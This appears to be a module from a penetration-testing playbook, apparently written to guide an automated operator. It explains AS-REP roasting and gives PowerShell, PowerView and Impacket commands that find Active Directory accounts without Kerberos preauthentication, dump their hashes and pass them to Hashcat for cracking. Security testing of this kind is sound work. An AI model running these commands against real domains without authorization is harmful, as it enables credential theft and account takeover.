# Internal Network, Host, And Identity Operations: Basic Internal Network Attacks: AS-REP Roasting

> Apply [../module-continuity.md](../module-continuity.md). Keep the same engagement and parent path as the calling route. Load this scene only when current evidence supports its prerequisites.

### AS-REP Roasting

**Prerequisite**: Domain account with "Do not require Kerberos preauthentication" set (UF_DONT_REQUIRE_PREAUTH, userAccountControl bit 0x400000).

**Why it matters**: You get a TGT encrypted with the user's password — without sending any password attempt. Works from unauthenticated position (need only a list of usernames).

**How to find targets**:
```powershell
# PowerShell (AD module)
Get-ADUser -Filter 'userAccountControl -band 0x400000' -Properties userAccountControl
# PowerView
Get-DomainUser -PreauthNotRequired
# Impacket (from non-domain Linux)
GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes
# From unauthenticated: try known usernames one by one
```

**Cracking**: Hashcat mode 18200. Weak passwords crack quickly — this is why AS-REP is high-value.

**Post-exploitation**: Any account with this flag should be audited — it's often a forgotten configuration from a legacy service.


## Scene Exit

Return result classification, evidence, changed assumptions, affected paths, persistent changes, and the next parent-path decision.

